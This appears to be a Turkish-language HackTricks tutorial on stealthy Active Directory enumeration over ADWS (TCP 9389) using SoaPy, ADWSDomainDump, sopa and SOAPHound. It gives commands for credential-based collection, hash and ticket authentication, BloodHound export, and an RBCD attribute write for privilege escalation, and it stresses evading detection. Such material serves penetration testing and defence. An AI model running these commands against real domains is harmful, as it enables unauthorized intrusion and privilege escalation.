# Active Directory Web Services (ADWS) Enumerasyonu ve Gizli Veri Toplama

{{#include ../../banners/hacktricks-training.md}}

## ADWS nedir?

Active Directory Web Services (ADWS), **Windows Server 2008 R2'den beri her Domain Controller'da varsayılan olarak etkindir** ve TCP **9389** portunu dinler. Adına rağmen **HTTP kullanılmaz**. Bunun yerine hizmet, LDAP tarzı verileri tescilli .NET çerçeveleme protokollerinden oluşan bir yığın üzerinden sunar:<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Trafik bu ikili SOAP çerçevelerinin içine kapsüllendiği ve yaygın olmayan bir port üzerinden iletildiği için **ADWS üzerinden yapılan enumerasyonun incelenmesi, filtrelenmesi veya imzalarla tespit edilmesi, klasik LDAP/389 ve 636 trafiğine kıyasla çok daha düşük olasılıktadır**. Operatörler için bu şu anlama gelir:<sup>[[1]](#references)[[7]](#references)</sup>

* Daha gizli keşif – Blue team'ler genellikle LDAP sorgularına odaklanır.
* **Windows dışı makinelerden (Linux, macOS)** SOCKS proxy üzerinden 9389/TCP tünelleyerek veri toplama özgürlüğü.
* LDAP üzerinden elde edeceğiniz verilerin aynısı (kullanıcılar, gruplar, ACL'ler, şema vb.) ve **yazma** işlemleri yapabilme olanağı (ör. **RBCD** için `msDs-AllowedToActOnBehalfOfOtherIdentity`).

ADWS etkileşimleri WS-Enumeration üzerinden uygulanır: her sorgu, LDAP filtresini/özniteliklerini tanımlayan ve bir `EnumerationContext` GUID döndüren bir `Enumerate` mesajıyla başlar; ardından sunucunun belirlediği sonuç penceresine kadar veriyi aktaran bir veya daha fazla `Pull` mesajı gelir.<sup>[[7]](#references)</sup> Bağlamlar yaklaşık 30 dakika sonra geçersiz hale gelir; bu nedenle araçların durumu kaybetmemek için sonuçları sayfalaması veya filtreleri (CN başına önek sorguları) bölmesi gerekir.<sup>[[8]](#references)</sup> Güvenlik tanımlayıcılarını isterken SACL'leri hariç tutmak için `LDAP_SERVER_SD_FLAGS_OID` denetimini belirtin; aksi takdirde ADWS, `nTSecurityDescriptor` özniteliğini SOAP yanıtından tamamen çıkarır.

> NOT: ADWS birçok RSAT GUI/PowerShell aracı tarafından da kullanılır; bu nedenle trafik, meşru yönetici etkinlikleriyle karışabilir.

## SoaPy – Yerel Python İstemcisi

[SoaPy](https://github.com/logangoins/soapy), **ADWS protokol yığınının tamamının saf Python ile yeniden uygulanmış halidir**. NBFX/NBFSE/NNS/NMF çerçevelerini bayt düzeyinde birebir oluşturur ve .NET çalışma ortamına dokunmadan Unix benzeri sistemlerden veri toplamayı sağlar.<sup>[[1]](#references)[[2]](#references)</sup>

### Temel Özellikler

* **SOCKS üzerinden proxy kullanmayı** destekler (C2 implantlarından kullanım için elverişlidir).
* LDAP `-q '(objectClass=user)'` ile aynı, ayrıntılı arama filtreleri.
* İsteğe bağlı **yazma** işlemleri ( `--set` / `--delete` ).
* BloodHound'a doğrudan aktarmak için **BOFHound çıktı modu**.<sup>[[3]](#references)</sup>
* İnsan tarafından okunabilir çıktı gerektiğinde zaman damgalarını / `userAccountControl` değerini biçimlendirmek için `--parse` bayrağı.<sup>[[2]](#references)</sup>

### Hedefli veri toplama bayrakları ve yazma işlemleri

SoaPy, ADWS üzerinden en yaygın LDAP avlama görevlerini gerçekleştiren, amaca yönelik seçeneklerle birlikte gelir: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds` ve özel veri çekme işlemleri için `--query` / `--filter` seçenekleri. Bunları `--rbcd <source>` (`msDs-AllowedToActOnBehalfOfOtherIdentity` ayarlar), `--spn <service/cn>` (hedefli Kerberoasting için SPN hazırlama) ve `--asrep` (`userAccountControl` içindeki `DONT_REQ_PREAUTH` değerini değiştirir) gibi yazma işlemleriyle birlikte kullanın.<sup>[[2]](#references)</sup>

Yalnızca `samAccountName` ve `servicePrincipalName` döndüren hedefli bir SPN avı örneği:

```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
      --spns -f samAccountName,servicePrincipalName --parse
```

Aynı host/credentials ile bulguları hemen weaponise edin: `--rbcds` ile RBCD-capable nesneleri dump edin, ardından Resource-Based Constrained Delegation zincirini hazırlamak için `--rbcd 'WEBSRV01$' --account 'FILE01$'` uygulayın (tam abuse path için [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) sayfasına bakın).

### Kurulum (operator host)

```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```

## ADWSDomainDump – Linux/Windows üzerinde ADWS aracılığıyla LDAPDomainDump

* LDAP imza tespitlerini azaltmak için LDAP sorgularını TCP/9389 üzerindeki ADWS çağrılarıyla değiştiren `ldapdomaindump` fork'u.
* `--force` verilmediği sürece 9389'a ilk erişilebilirlik kontrolünü yapar (port taramaları gürültülü/filtrelenmişse bu kontrolü atlar).
* README'de Microsoft Defender for Endpoint ve CrowdStrike Falcon'a karşı başarılı bypass testleri belirtilmiştir.<sup>[[4]](#references)</sup>

### Kurulum

```bash
pipx install .
```

### Kullanım

```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```

Tipik çıktı, 9389 erişilebilirlik kontrolünü, ADWS bind işlemini ve dump başlangıç/bitişini kaydeder:

```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

## Sopa - Golang'da ADWS için pratik bir istemci

soapy'ye benzer şekilde [sopa](https://github.com/Macmod/sopa), ADWS protocol stack'ini (MS-NNS + MC-NMF + SOAP) Golang'da uygular ve aşağıdaki gibi ADWS çağrıları yapmak için command-line flag'leri sunar:<sup>[[5]](#references)</sup>

* **Nesne arama ve getirme** - `query` / `get`
* **Nesne yaşam döngüsü** - `create [user|computer|group|ou|container|custom]` ve `delete`
* **Attribute düzenleme** - `attr [add|replace|delete]`
* **Hesap yönetimi** - `set-password` / `change-password`
* `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]` gibi diğer komutlar da mevcuttur.

### Protocol eşlemesinden öne çıkanlar

* LDAP tarzı aramalar; attribute projection, scope kontrolü (Base/OneLevel/Subtree) ve pagination ile **WS-Enumeration** (`Enumerate` + `Pull`) üzerinden yapılır.
* Tek nesne getirme için **WS-Transfer** `Get`; attribute değişiklikleri için `Put`; silme işlemleri için `Delete` kullanılır.
* Yerleşik nesne oluşturma işlemleri **WS-Transfer ResourceFactory** kullanır; özel nesneler ise YAML şablonlarıyla yönlendirilen bir **IMDA AddRequest** kullanır.
* Password işlemleri **MS-ADCAP** eylemleridir (`SetPassword`, `ChangePassword`).<sup>[[5]](#references)</sup>

### Kimlik doğrulamasız metadata keşfi (mex)

ADWS, kimlik bilgisi olmadan WS-MetadataExchange'e erişim sağlar. Bu, kimlik doğrulaması yapmadan önce maruziyeti doğrulamanın hızlı bir yoludur:<sup>[[5]](#references)</sup>

```bash
sopa mex --dc <DC>
```

### DNS/DC keşfi ve Kerberos hedefleme notları

`--dc` belirtilmemiş ve `--domain` sağlanmışsa Sopa, SRV üzerinden DC’leri çözümleyebilir. Sorguları bu sırayla yapar ve en yüksek öncelikli hedefi kullanır:<sup>[[5]](#references)</sup>

```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```

Operasyonel olarak, segmentlere ayrılmış ortamlarda hataları önlemek için DC tarafından kontrol edilen bir resolver kullanın:

* **Tüm** SRV/PTR/ileri yönlü aramaların DC DNS üzerinden yapılması için `--dns <DC-IP>` kullanın.
* UDP engellendiğinde veya SRV yanıtları büyük olduğunda `--dns-tcp` kullanın.
* Kerberos etkinse ve `--dc` bir IP adresiyse sopa, doğru SPN/KDC hedeflemesi için FQDN elde etmek üzere bir **ters PTR** araması yapar. Kerberos kullanılmıyorsa PTR araması yapılmaz.

Örnek (IP + Kerberos, DC üzerinden zorunlu DNS):

```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```

### Kimlik doğrulama materyali seçenekleri

Düz metin parolaların yanı sıra sopa, ADWS kimlik doğrulaması için **NT hash'lerini**, **Kerberos AES key'lerini**, **ccache**'i ve **PKINIT sertifikalarını** (PFX veya PEM) destekler. `--aes-key`, `-c` (ccache) veya sertifika tabanlı seçenekler kullanıldığında Kerberos kullanımı varsayılır.<sup>[[5]](#references)</sup>

```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```

### Şablonlar aracılığıyla özel nesne oluşturma

Rastgele nesne sınıfları için `create custom` komutu, IMDA `AddRequest` isteğiyle eşleşen bir YAML şablonu kullanır:<sup>[[5]](#references)</sup>

* `parentDN` ve `rdn`, kapsayıcıyı ve göreli DN'yi tanımlar.
* `attributes[].name`, `cn` veya ad alanlı `addata:cn` değerini destekler.
* `attributes[].type`, `string|int|bool|base64|hex` veya açıkça belirtilen `xsd:*` değerlerini kabul eder.
* **`ad:relativeDistinguishedName` veya `ad:container-hierarchy-parent` eklemeyin;** bunları sopa ekler.
* `hex` değerleri `xsd:base64Binary` biçimine dönüştürülür; boş dizeler ayarlamak için `value: ""` kullanın.

## SOAPHound – Yüksek Hacimli ADWS Toplama (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound), tüm LDAP etkileşimlerini ADWS içinde tutan ve BloodHound v4 uyumlu JSON çıktısı üreten bir .NET collector'dır. Önce `objectSid`, `objectGUID`, `distinguishedName` ve `objectClass` için eksiksiz bir önbellek oluşturur (`--buildcache`); ardından yüksek hacimli `--bhdump`, `--certdump` (ADCS) veya `--dnsdump` (AD ile tümleşik DNS) işlemlerinde bu önbelleği yeniden kullanır. Böylece DC'den yalnızca ~35 kritik öznitelik çıkar. AutoSplit (`--autosplit --threshold <N>`), büyük forest'larda 30 dakikalık EnumerationContext zaman aşımını aşmamak için sorguları CN önekine göre otomatik olarak parçalara ayırır.<sup>[[8]](#references)</sup>

Etki alanına katılmış bir operatör VM'sinde tipik iş akışı:

```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
              --autosplit --threshold 1200 --nolaps \
              -o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```

Dışa aktarılan JSON, doğrudan SharpHound/BloodHound iş akışlarına eklenebilir—sonraki aşamadaki graph oluşturma fikirleri için [BloodHound methodology](bloodhound.md) sayfasına bakın. AutoSplit, sorgu sayısını ADExplorer tarzı snapshot’lardan düşük tutarken SOAPHound’un milyonlarca nesne içeren forest’larda dayanıklı çalışmasını sağlar.

## Gizli AD Toplama İş Akışı

Aşağıdaki iş akışı, Linux’tan ADWS üzerinden **domain ve ADCS nesnelerinin** nasıl enumerate edileceğini, BloodHound JSON’a dönüştürüleceğini ve sertifika tabanlı saldırı yollarının nasıl aranacağını gösterir:

1. Hedef ağdan kendi makinenize **9389/TCP** tüneli açın (ör. Chisel, Meterpreter, SSH dinamik port yönlendirme vb. kullanarak). `export HTTPS_PROXY=socks5://127.0.0.1:1080` komutunu çalıştırın veya SoaPy’nin `--proxyHost/--proxyPort` seçeneklerini kullanın.

2. **Root domain nesnesini toplayın:**

```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -q '(objectClass=domain)' \
      | tee data/domain.log
```

3. **Configuration NC'den ADCS ile ilgili nesneleri toplayın:**

```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -dn 'CN=Configuration,DC=ludus,DC=domain' \
      -q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
           (objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
      | tee data/adcs.log
```

4. **BloodHound'a dönüştür:**

```bash
bofhound -i data --zip   # produces BloodHound.zip
```

5. **ZIP'i BloodHound GUI'ye yükleyin** ve sertifika yetki yükseltme yollarını (ESC1, ESC8 vb.) ortaya çıkarmak için `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` gibi cypher sorguları çalıştırın.

### `msDs-AllowedToActOnBehalfOfOtherIdentity` Yazma (RBCD)

```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
      --set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
      msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```

Bunu `s4u2proxy`/`Rubeus /getticket` ile birleştirerek tam bir **Resource-Based Constrained Delegation** zinciri oluşturun ([Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) bölümüne bakın).

## Araç Özeti

| Amaç | Araç | Notlar |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, okuma/yazma |
| Yüksek hacimli ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, önce cache, BH/ADCS/DNS modları |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | SoaPy/ldapsearch loglarını dönüştürür |
| Sertifika ihlali | [Certipy](https://github.com/ly4k/Certipy) | Aynı SOCKS üzerinden proxy'lenebilir |
| ADWS enumeration ve nesne değişiklikleri | [sopa](https://github.com/Macmod/sopa) | Bilinen ADWS endpoint'leriyle iletişim kurmak için genel amaçlı istemci; enumeration, nesne oluşturma, öznitelik değişiklikleri ve parola değişiklikleri sağlar |

## References

- [1] [SpecterOps – SOAP(y) Kullanmayı Unutmayın – ADWS Kullanarak Gizli AD Toplama için Operatör Kılavuzu](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy GitHub](https://github.com/logangoins/soapy)
- [3] [BOFHound GitHub](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa GitHub](https://github.com/Macmod/sopa)
- [6] [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF belirtimleri](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – ADWS Üzerinden Active Directory Ortamlarında Gizli Enumeration](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – ADWS Üzerinden Active Directory Verilerini Toplamaya Yönelik SOAPHound Aracı](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)
{{#include ../../banners/hacktricks-training.md}}
